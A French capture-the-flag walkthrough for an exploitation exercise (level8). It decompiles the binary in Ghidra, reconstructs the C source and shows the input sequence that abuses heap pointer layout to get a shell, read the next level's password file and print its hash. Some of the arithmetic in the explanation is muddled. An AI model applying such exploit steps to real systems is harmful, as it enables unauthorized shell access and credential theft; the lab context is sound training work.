# LEVEL 8
## Walkthrough

Voici les étapes suivit pour accéder au niveau supérieur, soit le `level9`.

1. Une fois connecté à la VM sur le `level8`, l'on retrouve un fichier `level8` situé à la racine du dossier utilisateur. Ce dernier s'avère être de nouveau un exécutable ELF (Executable and Linkable Format).

2. On extrait ce fichier sur la machine host soit en utilisant la commande `scp` soit en utilisant un logiciel créer à cet effet.

	```sh
	> scp -P 4242 level8@127.0.0.1:level8 /path/on/machine/host
	```

2. On ouvre ensuite ce fichier dans Ghidra et après analyse, on obtient le désassemblage ci-dessous (que l'on refactorise pour plus de clarté).

    ```sh
    undefined4 main(void)
	{
		char cVar1;
		char *pcVar2;
		int iVar3;
		uint uVar4;
		byte *pbVar5;
		byte *pbVar6;
		bool bVar7;
		undefined uVar8;
		undefined uVar9;
		bool bVar10;
		undefined uVar11;
		byte bVar12;
		byte local_90 [5];
		char local_8b [2];
		char acStack_89 [125];

		bVar12 = 0;
		do {
			printf("%p, %p \n",auth,service);
			pcVar2 = fgets((char *)local_90,0x80,stdin);
			bVar7 = false;
			bVar10 = pcVar2 == (char *)0x0;
			if (bVar10) {
				return 0;
			}
			iVar3 = 5;
			pbVar5 = local_90;
			pbVar6 = (byte *)"auth ";
			do {
				if (iVar3 == 0) break;
				iVar3 = iVar3 + -1;
				bVar7 = *pbVar5 < *pbVar6;
				bVar10 = *pbVar5 == *pbVar6;
				pbVar5 = pbVar5 + (uint)bVar12 * -2 + 1;
				pbVar6 = pbVar6 + (uint)bVar12 * -2 + 1;
			} while (bVar10);
			uVar8 = 0;
			uVar11 = (!bVar7 && !bVar10) == bVar7;
			if ((bool)uVar11) {
				auth = (undefined4 *)malloc(4);
				*auth = 0;
				uVar4 = 0xffffffff;
				pcVar2 = local_8b;
				do {
					if (uVar4 == 0) break;
					uVar4 = uVar4 - 1;
					cVar1 = *pcVar2;
					pcVar2 = pcVar2 + (uint)bVar12 * -2 + 1;
				} while (cVar1 != '\0');
				uVar4 = ~uVar4 - 1;
				uVar8 = uVar4 < 0x1e;
				uVar11 = uVar4 == 0x1e;
				if (uVar4 < 0x1f) {
					strcpy((char *)auth,local_8b);
				}
			}
			iVar3 = 5;
			pbVar5 = local_90;
			pbVar6 = (byte *)"reset";
			do {
				if (iVar3 == 0) break;
				iVar3 = iVar3 + -1;
				uVar8 = *pbVar5 < *pbVar6;
				uVar11 = *pbVar5 == *pbVar6;
				pbVar5 = pbVar5 + (uint)bVar12 * -2 + 1;
				pbVar6 = pbVar6 + (uint)bVar12 * -2 + 1;
			} while ((bool)uVar11);
			uVar9 = 0;
			uVar8 = (!(bool)uVar8 && !(bool)uVar11) == (bool)uVar8;
			if ((bool)uVar8) {
				free(auth);
			}
			iVar3 = 6;
			pbVar5 = local_90;
			pbVar6 = (byte *)"service";
			do {
				if (iVar3 == 0) break;
				iVar3 = iVar3 + -1;
				uVar9 = *pbVar5 < *pbVar6;
				uVar8 = *pbVar5 == *pbVar6;
				pbVar5 = pbVar5 + (uint)bVar12 * -2 + 1;
				pbVar6 = pbVar6 + (uint)bVar12 * -2 + 1;
			} while ((bool)uVar8);
			uVar11 = 0;
			uVar8 = (!(bool)uVar9 && !(bool)uVar8) == (bool)uVar9;
			if ((bool)uVar8) {
				uVar11 = (byte *)0xfffffff8 < local_90;
				uVar8 = acStack_89 == (char *)0x0;
				service = strdup(acStack_89);
			}
			iVar3 = 5;
			pbVar5 = local_90;
			pbVar6 = (byte *)"login";
			do {
				if (iVar3 == 0) break;
				iVar3 = iVar3 + -1;
				uVar11 = *pbVar5 < *pbVar6;
				uVar8 = *pbVar5 == *pbVar6;
				pbVar5 = pbVar5 + (uint)bVar12 * -2 + 1;
				pbVar6 = pbVar6 + (uint)bVar12 * -2 + 1;
			} while ((bool)uVar8);
			if ((!(bool)uVar11 && !(bool)uVar8) == (bool)uVar11) {
				if (auth[8] == 0) {
					fwrite("Password:\n",1,10,stdout);
				}
				else {
					system("/bin/sh");
				}
			}
		} while( true );
	}
	```

   À partir de ce désassemblage, on en déduit que le programme contient une grande fonction `main` qui, à première vue, est assez compliquer à comprendre. Il va donc falloir l'analyse, la comprendre et tenter d'en déduire le code réfactoriser située ci-dessous.

   ```sh
	#include <stdlib.h>
	#include <stdio.h>
	#include <string.h>
	#include <unistd.h>
	#include <sys/types.h>
	#include <time.h>
	#include <stdbool.h>

	int* auth;
	char* service;

	int main(void)
	{

		char *input;
		char inputBuffer[128];
		char authString[32];

		while (true)
		{
			printf("%p, %p \n", auth, service);
			input = fgets((char *)inputBuffer, 128, stdin); // 0x80 = 128 decimal
			if (input == NULL) {
				return EXIT_SUCCESS;
			}
			if (strncmp(inputBuffer, "auth ", 5) == 0) {
				auth = (int *) malloc(4);
				*auth = 0;

				if (strlen(authString) < 30) {
					strcpy((char *) auth, authString);
				}
			}
			else if (strncmp(inputBuffer, "reset", 5) == 0) {
				free(auth);
			}
			else if (strncmp(inputBuffer, "service", 7) == 0) {
				service = strdup(inputBuffer + 8);
			}
			else if (strncmp(inputBuffer, "login", 5) == 0) {
				if ((int) service - (int) auth == 32) {
					system("/bin/sh");
				} else {
					fwrite("Password:\n", 1, 10, stdout);
				}
			}
		}
		return EXIT_SUCCESS;
	}
	```

3. En se basant sur ces programmes, et plus particulièrement celui avec le code refactoriser, on peut tirer les conclusions suivantes :
    - Le programme déclare deux variables globales `auth` (un pointeur vers un entier) et `service` (un pointeur vers une chaîne de caractères).
    - Le programme lit en boucles les entrées de l'utilisateur à partir de la console. Plus précisément, lorsque l'utilisateur saisit une ligne de texte, le programme, vérifie le contenu de l'entrée à l'aide de la fonction `strncmp` pour déterminer quelles actions doivent être effectuées.
    - Si l'entrée commence par `auth ` (avec un espace étant donné qu'on spécifie à `strncmp` un `size_t n` de 5), le programme alloue dynamiquement de la mémoire pour stocker un entier `auth` et copie une chaîne de caractères dans cette mémoire.
    - Si l'entrée commence par `reset`, le programme libère la mémoire allouée pour `auth`.
    - Si l'entrée commence par `service`, le programme copie la partie de l'entrée après `service` dans la variable `service` (le programme utilise la fonction `strdup` et augmente l'adresse de `16 bytes`, soit la valeur `8` en décimal).
    - Si l'entrée commence par `login`, le programme effectue une comparaison entre les adresses mémoires de `service` et `auth`. Si la différence est de `32 octets` (généralement la taille d'un pointeur), il exécute `/bin/sh` (un shell interactif). Sinon, il affiche `Password:\n` dans la sortie standard.

4. De ce fait, on lance le programme et entre les chaînes de caractères spécifiées ci-dessus :
	- On entre `auth ` est on obtient l'adresse `0x804a008` ;
	- On entre `service` est on obtient l'adresse `0x804a018` ;
	- Pour valider la comparaison entre les adresses mémoires de `service` et `auth` et lancer le shell interactif, on lance la commande `service` 2 fois pour augmenter l'adresse de `32 bytes`, soit `16 bytes` fois 2.
	- Enfin, on entre la chaine de caractère `login` pour obtenir le shell interactif.
	- On lance la commande `whoami` pour vérifier que l'utilisateur est bien passé de `level8` à `level9`.
	- On `cat` le contenue du fichier `/home/user/level9/.pass` pour obtenir le mot de passe pour accéder au `level9`.

	```sh
    > ./level8
    (nil), (nil)
    > auth (with an empty space at the end)
    0x804a008, (nil)
    > service
    0x804a008, 0x804a018        // 0x804a008 + 0x10/16/8 = 0x804a018
    > service
    0x804a008, 0x804a028        // 0x804a008 + 0x10/32/16 = 0x804a028
    > login
    > whoami
	level9
    > cat /home/user/level9/.pass
    c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
    ```

5. On peut à présent passer au niveau supérieur en exécutant la commande `su level9` et en y spécifiant le mot de passe qui vient d'être trouvée.
    ```sh
    > su level9
    Password :
	> c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
    ```
